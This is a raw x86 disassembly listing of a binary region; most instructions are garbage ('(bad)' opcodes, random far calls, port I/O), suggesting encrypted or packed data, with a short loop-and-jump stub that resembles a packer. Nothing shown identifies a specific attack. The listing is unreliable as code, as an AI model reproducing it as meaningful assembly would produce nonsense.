  4060ad:	ins    DWORD PTR es:[edi],dx
  4060ae:	adc    al,0x98
  4060b0:	cwde   
  4060b1:	inc    ecx
  4060b2:	popf   
  4060b3:	dec    esp
  4060b4:	cmp    ah,BYTE PTR [ebx]
  4060b6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4060b7:	push   0xfffffffa
  4060b9:	adc    ebx,eax
  4060bb:	inc    ebx
  4060bc:	xor    eax,0xda8d7654
  4060c1:	mov    ebp,0x1055f4b5
  4060c6:	inc    ecx
  4060c7:	inc    esp
  4060c8:	xchg   esp,eax
  4060c9:	nop
  4060ca:	pop    ecx
  4060cb:	jns    0x406105
  4060cd:	jns    0x4060ae
  4060cf:	imul   DWORD PTR [ebx+0x5e0dcd4f]
  4060d5:	fs cdq 
  4060d7:	add    al,0xc4
  4060d9:	dec    ebp
  4060da:	fdiv   st,st(5)
  4060dc:	popa   
  4060dd:	jg     0x4060dc
  4060df:	stos   BYTE PTR es:[edi],al
  4060e0:	fwait
  4060e1:	and    esi,DWORD PTR [edi+ecx*4-0x69a3c823]
  4060e8:	mov    edx,0x9cce2f5d
  4060ed:	xchg   ebx,eax
  4060ee:	inc    ecx
  4060ef:	pusha  
  4060f0:	shl    BYTE PTR [ebp+0x6388552b],1
  4060f6:	cmp    BYTE PTR [ebx],al
  4060f8:	ins    BYTE PTR es:[edi],dx
  4060f9:	jle    0x4060d1
  4060fb:	pop    ss
  4060fc:	inc    ebx
  4060fd:	repz inc al
  406100:	mov    BYTE PTR [edi-0x16],ch
  406103:	jl     0x4060a3
  406105:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406106:	test   dl,al
  406108:	and    al,0xec
  40610a:	or     eax,0xd52b04da
  40610f:	jb     0x4060dc
  406111:	dec    ecx
  406112:	call   0x29fb0ad0
  406117:	(bad)  
  406118:	mov    ebp,0x8e43bc04
  40611d:	adc    al,0xc0
  40611f:	fwait
  406120:	pop    ds
  406121:	jmp    0xd541f73a
  406126:	aaa    
  406127:	mov    DWORD PTR [ebp-0x74e74a18],esi
  40612d:	les    edi,FWORD PTR [eax+ecx*8-0x53cc4ab5]
  406134:	in     al,0x5b
  406136:	out    0x4,al
  406138:	mov    DWORD PTR [esi*1+0x72aaaa17],esi
  40613f:	and    eax,0x6c743313
  406144:	add    al,0xe1
  406146:	and    al,BYTE PTR [edx]
  406148:	inc    edx
  406149:	cwde   
  40614a:	js     0x4060fc
  40614c:	mov    esp,0xae732435
  406151:	mov    ds:0xded76842,al
  406156:	shl    dl,1
  406158:	std    
  406159:	sub    eax,0x316acd3a
  40615e:	nop
  40615f:	lock xor esp,DWORD PTR [ebx+ebp*4]
  406163:	or     al,0xe9
  406165:	pop    ebp
  406166:	leave  
  406167:	pop    es
  406168:	rcl    BYTE PTR [edx+0x1e495e95],cl
  40616e:	jbe    0x406186
  406170:	cmp    ch,BYTE PTR [ecx+0x9386fc3]
  406176:	mov    ebp,0x2dbe38d
  40617b:	push   es
  40617c:	xchg   esp,eax
  40617d:	xor    ebx,DWORD PTR [ecx+ebp*1]
  406180:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406181:	dec    edx
  406182:	pop    es
  406183:	retf   0x7485
  406186:	scas   eax,DWORD PTR es:[edi]
  406187:	mov    ch,0x74
  406189:	jmp    0x40614b
  40618b:	push   edx
  40618c:	push   ss
  40618d:	mov    eax,0x481cc728
  406192:	scas   eax,DWORD PTR es:[edi]
  406193:	xchg   ecx,eax
  406194:	pop    ecx
  406195:	stos   DWORD PTR es:[edi],eax
  406196:	pop    ecx
  406197:	push   eax
  406198:	mov    al,0x7f
  40619a:	and    eax,0x6030c4a0
  40619f:	test   al,0x1e
  4061a1:	inc    ebp
  4061a2:	es mov edx,0x5dde828b
  4061a8:	jae    0x40620e
  4061aa:	ret    0x25da
  4061ad:	dec    esp
  4061ae:	mov    ebp,0x11869309
  4061b3:	imul   edx,DWORD PTR [ecx],0x88b06d95
  4061b9:	test   BYTE PTR [ecx],bl
  4061bb:	div    BYTE PTR [edx+0x32]
  4061be:	add    BYTE PTR [ebx-0x39ccf3bb],cl
  4061c4:	add    eax,edi
  4061c6:	pop    edi
  4061c7:	pop    esi
  4061c8:	pop    ebx
  4061c9:	leave  
  4061ca:	ret    0x8
  4061cd:	xor    eax,eax
  4061cf:	ret    
  4061d0:	push   ebp
  4061d1:	mov    ebp,esp
  4061d3:	sub    esp,0x38
  4061d6:	and    DWORD PTR ds:0x428ec7,0x0
  4061e0:	xor    eax,eax
  4061e2:	xor    eax,DWORD PTR ds:0x428ec7
  4061e8:	inc    eax
  4061e9:	mov    ds:0x428ec7,eax
  4061ee:	cmp    DWORD PTR ds:0x428ec7,0x24
  4061f5:	jg     0x406216
  4061fb:	jmp    0x406209
  406200:	push   DWORD PTR [ebp-0x18]
  406203:	call   DWORD PTR ds:0x42aa1b
  406209:	cmp    DWORD PTR ds:0x428ec7,0x19
  406210:	jb     0x4061e0
  406216:	mov    DWORD PTR [ebp-0x4],0xf89c85a5
  40621d:	push   ebx
  40621e:	mov    eax,ds:0x428e23
  406223:	adc    DWORD PTR ds:0x428e9f,eax
  406229:	jmp    0x4085d8
  40622e:	xchg   ebp,eax
  40622f:	(bad)
  406232:	xchg   edx,eax
  406233:	add    al,0x95
  406235:	(bad)
  406239:	stos   DWORD PTR es:[edi],eax
  40623a:	aas    
  40623b:	cmp    al,0x26
  40623d:	pop    eax
  40623e:	or     edi,DWORD PTR ds:0x60f18383
  406244:	add    DWORD PTR [ebx-0x5ba663a9],0xffffffbe
  40624b:	inc    esp
  40624c:	push   cs
  40624d:	sub    DWORD PTR [ecx+0x7e],ebp
  406250:	mov    cl,0xf5
  406252:	sar    esp,1
  406254:	rcr    BYTE PTR [edx-0x3c],1
  406257:	push   edx
  406258:	pop    ebp
  406259:	adc    DWORD PTR [ecx+eax*8],ebx
  40625c:	mov    al,0x69
  40625e:	sbb    al,0xf6
  406260:	in     al,0xbf
  406262:	or     cl,al
  406264:	push   es
  406265:	inc    esi
  406266:	ins    BYTE PTR es:[edi],dx
  406267:	xor    ebp,DWORD PTR [edi+0x45a96414]
  40626d:	adc    al,0xd4
  40626f:	stos   DWORD PTR es:[edi],eax
  406270:	scas   eax,DWORD PTR es:[edi]
  406271:	ss cmp al,0xa1
  406274:	xchg   esi,eax
  406275:	sub    BYTE PTR [ebx],cl
  406277:	dec    esi
  406278:	push   ss
  406279:	std    
  40627a:	out    0x8a,eax
  40627c:	(bad)  
  40627d:	lahf   
  40627e:	std    
  40627f:	call   0x6ed0:0x5c40c845
  406286:	and    esp,DWORD PTR [esi]
  406288:	std    
  406289:	nop
  40628a:	sub    edi,DWORD PTR [edi+0x52290592]
  406290:	fld    QWORD PTR [esi-0x66]
  406293:	les    ebp,FWORD PTR [ebx-0x14cd4b8d]
  406299:	sub    BYTE PTR [ebx+0x8],bh
  40629c:	lods   eax,DWORD PTR ds:[esi]
  40629d:	pop    es
  40629e:	adc    ebp,DWORD PTR [esi]
  4062a0:	sar    DWORD PTR [ebp+esi*2-0x54423126],0xd9
  4062a8:	pop    edi
  4062a9:	xor    BYTE PTR [eax+eax*4-0xa829d57],dh
  4062b0:	xchg   esi,eax
  4062b1:	cmp    BYTE PTR [edx],dl
  4062b3:	xchg   esi,eax
  4062b4:	rol    edx,cl
  4062b6:	jmp    0x406303
  4062b8:	int3   
  4062b9:	jmp    0xd510313e
  4062be:	mov    edx,0x52f9dabd
  4062c3:	aad    0xe7
  4062c5:	mov    dh,0xec
  4062c7:	push   0xa3efcc8e
  4062cc:	mov    edx,0xc239101b
  4062d1:	or     eax,0xc593ac33
  4062d6:	test   esp,esi
  4062d8:	xor    ebx,0x7162a992
  4062de:	dec    edx
  4062df:	gs add esp,ebp
  4062e2:	push   edx
  4062e3:	pop    ecx
  4062e4:	bnd jb 0x406299
  4062e7:	dec    ebp
  4062e8:	mov    ch,0xf4
  4062ea:	xchg   edx,eax
  4062eb:	pop    ecx
  4062ec:	adc    eax,DWORD PTR [eax-0xd]
  4062ef:	sbb    esp,esi
  4062f1:	(bad)  [edi]
  4062f3:	inc    ebp
  4062f4:	(bad)  
  4062f5:	mov    dl,dh
  4062f7:	jnp    0x40634c
  4062f9:	addr16 pop ebp
  4062fb:	dec    esi
  4062fc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4062fd:	or     DWORD PTR [edi-0x6b],0xffffffd2
  406301:	mov    ch,0xc2
  406303:	call   0x3fdf7e69
  406308:	push   cs
  406309:	ins    BYTE PTR es:[edi],dx
  40630a:	sbb    eax,0xaf72583b
  40630f:	adc    cl,BYTE PTR [ebx-0xb]
  406312:	pop    es
  406313:	mov    bl,0xaa
  406315:	imul   DWORD PTR [esi+0x72adea33]
  40631b:	popf   
  40631c:	clc    
  40631d:	retf   
  40631e:	in     al,0xe8
  406320:	sti    
  406321:	and    al,0xb6
  406323:	js     0x406316
  406325:	push   edi
  406326:	(bad)  
  406327:	cmp    ebx,DWORD PTR [ebx-0x49]
  40632a:	jg     0x40639a
  40632c:	in     al,0xcb
  40632e:	ds out 0xef,al
  406331:	ins    DWORD PTR es:[edi],dx
  406332:	arpl   ax,bp
  406334:	xor    al,0x84
  406336:	xchg   ebp,eax
  406337:	pop    esp
  406338:	in     eax,dx
  406339:	int3   
  40633a:	mov    edi,0xec44a7b2
  40633f:	sub    esp,edi
  406341:	pop    esi
  406342:	add    al,0x7a
  406344:	imul   esp,DWORD PTR [edi],0x2e
  406347:	cmp    al,0x4d
  406349:	icebp  
  40634a:	imul   esp,DWORD PTR [ecx-0x30],0x6bee00ec
  406351:	cwd    
  406353:	xchg   ebp,eax
  406354:	(bad)  
  406355:	out    dx,al
  406356:	and    ebp,ebx
  406358:	dec    ebx
  406359:	(bad)  
  40635a:	iret   
  40635b:	test   al,0xed
  40635d:	cld    
  40635e:	pop    es
  40635f:	xchg   ebx,eax
  406360:	pop    ss
  406361:	imul   esp,eax,0xf
  406364:	push   cs
  406365:	sbb    esi,DWORD PTR [esi+eax*4-0x48a1f888]
  40636c:	scas   eax,DWORD PTR es:[edi]
  40636d:	sti    
  40636e:	dec    ecx
  40636f:	imul   ebp,DWORD PTR [eax],0x17a6afd1
  406375:	sahf   
  406376:	scas   al,BYTE PTR es:[edi]
  406377:	ja     0x406313
  406379:	outs   dx,DWORD PTR ds:[esi]
  40637a:	aad    0x9f
  40637c:	pop    esp
  40637d:	inc    edx
  40637e:	std    
  40637f:	aam    0xb1
  406381:	mov    gs,WORD PTR [esi]
  406383:	mov    WORD PTR [edx+0x2e941f03],?
  406389:	clc    
  40638a:	pop    ebp
  40638b:	in     eax,0x1
  40638d:	js     0x406394
  40638f:	mov    ch,0x44
  406391:	ds xor al,0x24
  406394:	ss adc ch,al
  406397:	call   0x9c9a6e24
  40639c:	push   ds
  40639d:	cmp    edx,DWORD PTR [ebp-0xb]
  4063a0:	mov    DWORD PTR [esi+ebx*8+0x383d7b8f],ecx
  4063a7:	inc    esi
  4063a8:	sbb    DWORD PTR [eax],edx
  4063aa:	or     edx,ebp
  4063ac:	push   es
  4063ad:	xor    bl,bl
  4063af:	lods   al,BYTE PTR ds:[esi]
  4063b0:	clc    
  4063b1:	mov    eax,0x1a72d418
  4063b6:	les    ebx,FWORD PTR [eax+esi*2-0x8]
  4063ba:	pop    ecx
  4063bb:	and    DWORD PTR [ecx-0x2],0xbb1e6f3b
  4063c2:	scas   al,BYTE PTR es:[edi]
  4063c3:	loope  0x4063b4
  4063c5:	xchg   esp,eax
  4063c6:	pop    edx
  4063c7:	in     al,0x6e
  4063c9:	push   cs
  4063ca:	test   edi,edi
  4063cc:	not    bl
  4063ce:	dec    ebp
  4063cf:	adc    al,0x79
  4063d1:	lods   al,BYTE PTR ds:[esi]
  4063d2:	dec    BYTE PTR [ebx-0x59]
  4063d5:	mov    ecx,0x7d5b6e33
  4063da:	dec    ebp
  4063db:	inc    eax
  4063dc:	and    eax,0x88736bf7
  4063e1:	mov    DWORD PTR [edi+0x61],ebp
  4063e4:	scas   al,BYTE PTR es:[edi]
  4063e5:	imul   eax,ebx,0xd3fddc0b
  4063eb:	lds    edx,FWORD PTR [ecx+0x3b]
  4063ee:	mov    DWORD PTR [edx-0x10e09486],ebp
  4063f4:	fdiv   st(7),st
  4063f6:	es jmp 0x7ae3a824
  4063fc:	dec    edi
  4063fd:	jo     0x40641e
  4063ff:	ins    DWORD PTR es:[edi],dx
  406400:	pop    esp
  406401:	rcr    ah,1
  406403:	mov    bl,ah
  406405:	adc    DWORD PTR [eax-0x9],edi
  406408:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406409:	cwde   
  40640a:	loope  0x40640c
  40640c:	sbb    dh,BYTE PTR [esi+0x2434b79f]
  406412:	jbe    0x4063a6
  406414:	retf   
  406415:	enter  0xbc39,0xaf
  406419:	fisttp WORD PTR [ebp-0x3cac792]
  40641f:	retf   0xb7c4
  406422:	hlt    
  406423:	scas   al,BYTE PTR es:[edi]
  406424:	sbb    cl,BYTE PTR [ebx+eax*4]
  406427:	mov    ecx,0x605a6a60
  40642c:	in     al,0xfa
  40642e:	(bad)  
  40642f:	lea    ebp,[ebx+0xa]
  406432:	ss ret 0x766c
  406436:	jl     0x4063cb
  406438:	jmp    0x4063f9
  40643a:	or     DWORD PTR [eax],eax
  40643c:	jle    0x40640f
  40643e:	dec    ebp
  40643f:	fbld   TBYTE PTR [edi+0x7]
  406442:	push   edx
  406443:	jp     0x4063fc
  406445:	mov    eax,0x69bf346f
  40644a:	ror    ebx,0xcf
  40644d:	jmp    0x4063e2
  40644f:	mov    ch,0x3b
  406451:	repnz xchg esp,eax
  406453:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406454:	sub    BYTE PTR [ebx-0x188afeb1],al
  40645a:	pusha  
  40645b:	add    DWORD PTR [edx],esp
  40645d:	rep lods eax,DWORD PTR ds:[esi]
  40645f:	mov    ch,0xad
  406461:	jp     0x406472
  406463:	mov    eax,0xfb3db978
  406468:	mov    bl,cl
  40646a:	test   al,0x74
  40646c:	iret   
  40646d:	popf   
  40646e:	inc    edx
  40646f:	out    dx,al
  406470:	retf   
  406471:	popa   
  406472:	push   esi
  406473:	repz jmp 0xfa4f978c
  406479:	push   esp
  40647a:	sub    BYTE PTR [ebx+0x43df6608],0xa4
  406481:	imul   eax,DWORD PTR [edi+0x26],0x76
  406485:	xor    DWORD PTR [ebp-0x5de79d37],eax
  40648b:	nop
  40648c:	pop    ebp
  40648d:	outs   dx,DWORD PTR ds:[esi]
  40648e:	neg    DWORD PTR [eax]
  406490:	pusha  
  406491:	push   ss
  406492:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406493:	ss cwde 
  406495:	mov    ch,0xd7
  406497:	iret   
  406498:	pop    es
  406499:	test   dl,dl
  40649b:	sti    
  40649c:	clc    
  40649d:	push   ebx
  40649e:	shl    esi,cl
  4064a0:	gs leave 
  4064a2:	clc    
  4064a3:	push   0xfffffff9
  4064a5:	inc    edx
  4064a6:	add    eax,0x2a0ea796
  4064ab:	or     esi,DWORD PTR [ebp-0x72]
  4064ae:	ins    DWORD PTR es:[edi],dx
  4064af:	dec    ebx
  4064b0:	inc    eax
  4064b1:	dec    ch
  4064b3:	das    
  4064b4:	xor    eax,0xd334c953
  4064b9:	jns    0x406515
  4064bb:	inc    ebp
  4064bc:	int    0x98
  4064be:	push   esp
  4064bf:	inc    ebx
  4064c0:	cmp    edi,DWORD PTR [edi]
  4064c2:	pop    ds
  4064c3:	xor    al,0x4
  4064c5:	jae    0x4064f7
  4064c7:	ds es call 0x3c2:0x6d00599e
  4064d0:	stos   DWORD PTR es:[edi],eax
  4064d1:	pusha  
  4064d2:	loop   0x4064db
  4064d4:	cmp    DWORD PTR [ebx*1-0x3408135d],0x71
  4064dc:	clc    
  4064dd:	out    0x8f,eax
  4064df:	aam    0x8c
  4064e1:	add    DWORD PTR [ebx+0x22],esi
  4064e4:	mov    bl,0x45
  4064e6:	adc    ebp,DWORD PTR [ebx+0x16813c92]
  4064ec:	fucomip st,st(4)
  4064ee:	push   ecx
  4064ef:	out    0x5f,al
  4064f1:	xchg   edx,eax
  4064f2:	pop    ebx
  4064f3:	out    0xc2,eax
  4064f5:	mov    esp,0xb76e5844
  4064fa:	enter  0xf2ca,0x18
  4064fe:	add    eax,0x33e820bc
  406503:	clc    
  406504:	jge    0x406533
  406506:	and    al,0x48
  406508:	out    dx,al
  406509:	sbb    dh,dh
  40650b:	sar    bh,1
  40650d:	push   edx
  40650e:	ds mov edi,esp
  406511:	inc    edx
  406512:	or     al,0xf0
  406514:	cli    
  406515:	call   0x33eeaa96
  40651a:	call   DWORD PTR [esi-0x6d]
  40651d:	outs   dx,BYTE PTR ds:[esi]
  40651e:	sbb    al,0xbe
  406520:	fisubr WORD PTR [ebp-0x2e62134b]
  406526:	pop    ecx
  406527:	push   ds
  406528:	add    ah,BYTE PTR [edx+0x496cc438]
  40652e:	dec    edx
  40652f:	add    eax,0x13a1a24a
  406534:	mov    ah,0x9a
  406536:	add    al,0x95
  406538:	adc    DWORD PTR [edi],ebx
  40653a:	test   al,0xd7
  40653c:	cwde   
  40653d:	pushf  
  40653e:	mov    eax,ds:0x78d0dbf2
  406543:	dec    ecx
  406544:	enter  0x1d4f,0xd1
  406548:	call   0xf0f606af
  40654d:	in     al,0x49
  40654f:	(bad)  [eax-0x5f9ab3d4]
  406555:	xchg   ebp,eax
  406556:	mov    esp,0xadaa9b9
  40655b:	cs cwde 
  40655d:	les    edi,FWORD PTR [ebx-0x6da6de6d]
  406563:	lods   al,BYTE PTR ss:[esi]
  406565:	mov    al,ds:0x94d52d0f
  40656a:	add    ah,BYTE PTR [ebx+ebx*1-0x3b]
  40656e:	js     0x4065eb
  406570:	(bad)  
  406571:	cli    
  406572:	mov    ds:0xfaa674d0,al
  406577:	scas   al,BYTE PTR es:[edi]
  406578:	adc    eax,0xe8275254
  40657d:	stos   BYTE PTR es:[edi],al
  40657e:	sub    eax,0x36c05653
  406583:	fdivr  QWORD PTR [ebx]
  406586:	and    DWORD PTR [edi-0x12],0x14
  40658a:	xchg   esp,eax
  40658b:	jecxz  0x406568
  40658d:	push   esp
  40658e:	jp     0x406567
  406590:	dec    esi
  406591:	or     al,0xd
  406593:	stos   BYTE PTR es:[edi],al
  406594:	bound  edx,QWORD PTR [edx+0x7d21a20]
  40659a:	lods   al,BYTE PTR ds:[esi]
  40659b:	push   es
  40659c:	int    0x2
  40659e:	xchg   edi,eax
  40659f:	stos   BYTE PTR es:[edi],al
  4065a0:	test   al,0x86
  4065a2:	mov    ds:0xf98e2875,al
  4065a7:	mov    esp,0x666df10
  4065ac:	pop    ebp
  4065ad:	xor    BYTE PTR [edi],dl
  4065af:	add    BYTE PTR [esi-0x12],bh
  4065b2:	jecxz  0x406620
  4065b4:	test   al,0x28
  4065b6:	pop    eax
  4065b7:	dec    ecx
  4065b8:	push   edi
  4065b9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4065ba:	iret   
  4065bb:	adc    al,0xee
  4065bd:	pop    ebx
  4065be:	call   0x1d36514e
  4065c3:	pop    ebp
  4065c4:	inc    ebp
  4065c5:	adc    BYTE PTR [eax-0x2efa5e83],0x3c
  4065cc:	jl     0x406563
  4065ce:	mov    ecx,0xde390a04
  4065d3:	jg     0x4065e2
  4065d5:	hlt    
  4065d6:	mov    edx,0x801783be
  4065db:	pop    eax
  4065dc:	lahf   
  4065dd:	in     al,0xf9
  4065df:	mov    esp,0x6fb74428
  4065e4:	in     eax,0x42
  4065e6:	add    al,0xa2
  4065e8:	ret    
  4065e9:	push   ds
  4065ea:	dec    esp
  4065eb:	dec    eax
  4065ec:	test   DWORD PTR gs:[edx],esp
  4065ef:	retf   
  4065f0:	shl    BYTE PTR [edi-0x1138fca0],1
  4065f6:	push   ebx
  4065f7:	and    al,0x15
  4065f9:	pop    eax
  4065fa:	sbb    DWORD PTR [eax],ebp
  4065fc:	(bad)  
  4065fd:	xchg   esp,eax
  4065fe:	jno    0x40659b
  406600:	adc    ecx,DWORD PTR [eax]
  406602:	mov    esi,?
  406604:	xor    dh,bh
  406606:	inc    esi
  406607:	push   edi
  406608:	add    edi,esp
  40660a:	and    DWORD PTR [ebx],esp
  40660c:	push   ecx
  40660d:	data16 fdiv st,st(1)
  406610:	iret   
  406611:	inc    ebp
  406612:	xchg   esp,eax
  406613:	int    0xf6
  406615:	jnp    0x406649
  406617:	stc    
  406618:	test   al,0x71
  40661a:	xor    ebp,ebx
  40661c:	loopne 0x406697
  40661e:	pop    edi
  40661f:	sub    edx,DWORD PTR [eax+0x2a9162a8]
  406625:	add    DWORD PTR [ecx+0x1],esp
  406628:	mov    eax,ds:0x254b1381
  40662d:	mov    dh,0x6b
  40662f:	cmp    al,0xb4
  406631:	jge    0x4066a4
  406633:	stc    
  406634:	retf   
  406635:	rcl    DWORD PTR [esi],0xb0
  406638:	or     al,BYTE PTR [edi-0x61]
  40663b:	xchg   ebp,eax
  40663c:	inc    ecx
  40663d:	inc    ebp
  40663e:	cmp    ah,ch
  406640:	xchg   esi,eax
  406641:	repz daa 
  406643:	imul   ebp,DWORD PTR [ecx+edi*2],0xc3d97ac5
  40664a:	xor    BYTE PTR [esi],bh
  40664c:	add    DWORD PTR ds:0x42f5bf23,ecx
  406652:	and    ch,BYTE PTR ds:0x5dc74a69
  406658:	push   es
  406659:	loopne 0x4066b2
  40665b:	sub    eax,0x8588f2af
  406660:	pop    esp
  406661:	or     DWORD PTR [esi],0xa0f1572
  406667:	mov    ebx,0x9c4a4895
  40666c:	push   ecx
  40666d:	xchg   esp,eax
  40666e:	push   edx
  40666f:	loop   0x406652
  406671:	nop
  406672:	test   DWORD PTR [edi+esi*2-0x32dba4b],0xae9dbae5
  40667d:	in     al,0x48
  40667f:	call   0x3f86ad16
  406684:	(bad)  
  406685:	mov    esi,0xf905c3d6
  40668a:	(bad)  [ecx]
  40668c:	je     0x406661
  40668e:	in     al,dx
  40668f:	xchg   esp,eax
  406690:	neg    al
  406692:	or     edx,DWORD PTR [edi-0x14]
  406695:	in     eax,0xfd
  406697:	push   ebx
  406698:	mov    eax,0x45952468
  40669d:	cmp    al,bh
  40669f:	mov    bh,0xa5
  4066a1:	dec    BYTE PTR [eax-0x344ec603]
  4066a7:	add    eax,0x5fceed6
  4066ac:	mov    eax,ds:0xf9055ad4
  4066b1:	rcr    BYTE PTR [edi+0x4],cl
  4066b4:	enter  0x3cd5,0x91
  4066b8:	mov    bl,0xc2
  4066ba:	cmp    al,0x78
  4066bc:	push   0x71b83d53
  4066c1:	jmp    0x811c:0xfcabaf53
  4066c8:	packssdw mm3,QWORD PTR [edi]
  4066cb:	inc    ecx
  4066cc:	jecxz  0x406686
  4066ce:	ret    0xf942
  4066d1:	xchg   BYTE PTR [edx+edi*1-0x74],ah
  4066d5:	adc    edx,DWORD PTR [ebx+0xb]
  4066d8:	mov    al,ds:0x3eda3e84
  4066de:	popf   
  4066df:	lds    edx,FWORD PTR [esi+0x9]
  4066e2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4066e3:	bound  ebp,QWORD PTR [ecx-0x44189cb0]
  4066e9:	xchg   esi,eax
  4066ea:	fwait
  4066eb:	das    
  4066ec:	xor    DWORD PTR [ebx-0x2d3d49a3],edx
  4066f2:	(bad)  
  4066f4:	adc    edi,ebp
  4066f6:	lds    ebp,FWORD PTR [edi+0x1f]
  4066f9:	(bad)  [edx]
  4066fb:	sbb    DWORD PTR ds:[ebx+0x7c],esi
  4066ff:	jnp    0x4066b7
  406701:	mov    al,ds:0xc292cf31
  406706:	aam    0x94
  406708:	loopne 0x406734
  40670a:	fisubr DWORD PTR [ebx+0x5c1ac665]
  406710:	nop
  406711:	daa    
  406712:	push   ss
  406713:	fst    st(4)
  406715:	push   esp
  406716:	push   esp
  406717:	and    eax,0x859f4bf2
  40671c:	sahf   
  40671d:	data16 mov bh,0xb8
  406720:	je     0x4066d6
  406722:	jle    0x40671a
  406724:	cld    
  406725:	outs   dx,DWORD PTR ds:[esi]
  406726:	push   ebx
  406727:	mov    ah,0x6f
  406729:	xor    eax,0x64a62905
  40672e:	in     eax,dx
  40672f:	(bad)  
  406730:	lahf   
  406731:	ja     0x4066b5
  406733:	adc    al,0xbb
  406735:	or     dh,BYTE PTR [bx+si]
  406738:	lds    eax,FWORD PTR ds:0xcf8c7d34
  40673e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40673f:	and    DWORD PTR [ecx+0x66],esp
  406742:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406743:	xchg   ebx,eax
  406744:	mov    al,0xed
  406746:	push   esi
  406747:	ret    
  406748:	leave  
  406749:	jo     0x40677c
  40674b:	bound  ecx,QWORD PTR [ecx-0x139537f1]
  406751:	hlt    
  406752:	das    
  406753:	mov    ch,0xc7
  406755:	add    al,0xf8
  406757:	xor    al,0xcd
  406759:	je     0x4067d6
  40675b:	pusha  
  40675c:	xor    DWORD PTR [ebp+0x46109946],ebx
  406762:	or     BYTE PTR [ebx],bl
  406764:	in     al,dx
  406765:	dec    ebx
  406766:	popa   
  406767:	dec    ebx
  406768:	adc    cl,ch
  40676a:	mov    fs,WORD PTR [edi+0x62]
  40676d:	inc    eax
  40676e:	mov    ch,0x8a
  406770:	scas   al,BYTE PTR es:[edi]
  406771:	and    eax,0x46c5882a
  406776:	mov    gs,WORD PTR [eax-0x6f2d8845]
  40677c:	ret    0x67da
  40677f:	pop    ss
  406780:	xchg   esi,eax
  406781:	imul   esp,ebp,0xc307c838
  406787:	inc    edi
  406788:	mov    WORD PTR [ecx-0x2919d52d],?
  40678e:	scas   al,BYTE PTR es:[edi]
  40678f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406790:	call   0xcc26:0x618d7ec4
  406797:	cmp    BYTE PTR [eax+0x42],al
  40679a:	es push edi
  40679c:	enter  0xf5e3,0xb2
  4067a0:	ins    BYTE PTR es:[edi],dx
  4067a1:	sbb    ebx,ebx
  4067a3:	dec    esp
  4067a4:	jge    0x4067e8
  4067a6:	int3   
  4067a7:	jg     0x406785
  4067a9:	retw   0x5d6
  4067ad:	ss push esp
  4067af:	push   cs
  4067b0:	pop    ss
  4067b1:	pusha  
  4067b2:	mov    esp,edi
  4067b4:	sbb    al,BYTE PTR [esi]
  4067b6:	or     eax,0x6475a187
  4067bb:	sbb    al,dh
  4067bd:	mov    esp,0x1d8d5e17
  4067c2:	arpl   dx,bx
  4067c4:	mov    eax,ds:0x3830a284
  4067c9:	(bad)  
  4067ca:	(bad)  
  4067cb:	cmp    al,0x4c
  4067cd:	push   eax
  4067ce:	jno    0x406799
  4067d0:	dec    edx
  4067d1:	and    eax,0x5543a723
  4067d6:	xlat   BYTE PTR ds:[ebx]
  4067d7:	iret   
  4067d8:	push   ebx
  4067d9:	and    bh,BYTE PTR [edx+0x664f3559]
  4067df:	inc    ebp
  4067e0:	icebp  
  4067e1:	es clc 
  4067e3:	(bad)  
  4067e5:	sbb    BYTE PTR [ebp+0x1b26ccd3],ch
  4067eb:	(bad)  
  4067ec:	jl     0x406824
  4067ee:	retf   
  4067ef:	stc    
  4067f0:	mov    eax,0xb6dfa329
  4067f5:	inc    edx
  4067f6:	sub    eax,0xb4afa32a
  4067fb:	push   0x69
  4067fd:	sub    ebp,esp
  4067ff:	or     eax,0xd51a51b9
  406804:	jg     0x406864
  406806:	into   
  406807:	pop    esi
  406808:	jb     0x4067d9
  40680a:	leave  
  40680b:	add    al,0xe5
  40680d:	inc    eax
  40680e:	jb     0x4067cd
  406810:	leave  
  406811:	pop    edx
  406812:	sub    eax,0x96f60d82
  406817:	sbb    bl,BYTE PTR [edx]
  406819:	sbb    BYTE PTR [ebp+0xd3b078b],dl
  40681f:	lock ss dec ebx
  406822:	jle    0x40684f
  406824:	in     al,dx
  406825:	pop    es
  406826:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406827:	int3   
  406828:	mov    ecx,0x13c080bf
  40682d:	or     ah,BYTE PTR [esi]
  40682f:	repz jo 0x406814
  406832:	sbb    eax,0xb97f3a02
  406837:	cmp    ah,BYTE PTR [esi-0x8]
  40683a:	mov    ecx,0x3ee5f30
  40683f:	fld    QWORD PTR ds:0xe3a1e906
  406845:	jne    0x4068a2
  406847:	mov    ch,0x4c
  406849:	ins    DWORD PTR es:[edi],dx
  40684a:	repz mov ebx,0x5ccab5c8
  406850:	jp     0x4067d4
  406852:	fnstsw WORD PTR [edx-0x55]
  406855:	mov    WORD PTR [edx+0x7aba687],?
  40685b:	dec    esp
  40685c:	push   esi
  40685d:	jg     0x40684a
  40685f:	jle    0x4068d0
  406861:	adc    ebx,esp
  406863:	retf   
  406864:	daa    
  406865:	adc    dh,BYTE PTR [eax+ecx*4-0x3485b710]
  40686c:	inc    ebx
  40686d:	inc    esi
  40686e:	into   
  40686f:	pop    ecx
  406870:	test   BYTE PTR ds:0x8bd71842,cl
  406876:	adc    ah,dl
  406878:	leave  
  406879:	call   0x9692953a
  40687e:	pop    edi
  40687f:	pop    eax
  406880:	and    DWORD PTR [ebx],ecx
  406882:	sbb    BYTE PTR [edi+0x32],0xa4
  406886:	aas    
  406887:	adc    BYTE PTR [ebp-0x686279d6],cl
  40688d:	push   eax
  40688e:	add    eax,0x7f4cc7ce
  406893:	loopne 0x4068e5
  406895:	pop    ds
  406896:	pop    edi
  406897:	jg     0x406822
  406899:	(bad)  
  40689a:	or     edx,DWORD PTR [ecx+0x7e]
  40689d:	cmp    eax,0xb657f9ef
  4068a2:	sahf   
  4068a3:	nop
  4068a4:	pop    edi
